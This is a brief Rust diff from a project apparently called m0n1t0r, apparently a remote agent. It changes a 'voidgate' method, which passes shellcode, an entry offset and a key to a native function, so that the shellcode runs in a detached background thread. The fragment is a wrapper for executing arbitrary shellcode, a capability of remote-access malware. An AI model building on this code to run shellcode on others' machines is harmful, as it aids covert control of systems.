@@ -116,13 +116,10 @@ impl m0n1t0r_common::process::Agent for AgentObj {
     }
 
     async fn voidgate(&self, shellcode: Vec<u8>, ep_offset: u32, key: String) -> AppResult<()> {
-        let (tx, rx) = oneshot::channel();
-
         thread::spawn(move || {
-            let _ = tx.send(ffi::voidgate(shellcode, ep_offset, key)?);
-            Ok::<_, Error>(())
+            let _ = ffi::voidgate(shellcode, ep_offset, key);
         });
-        Ok(rx.await?)
+        Ok(())
     }
 }
 
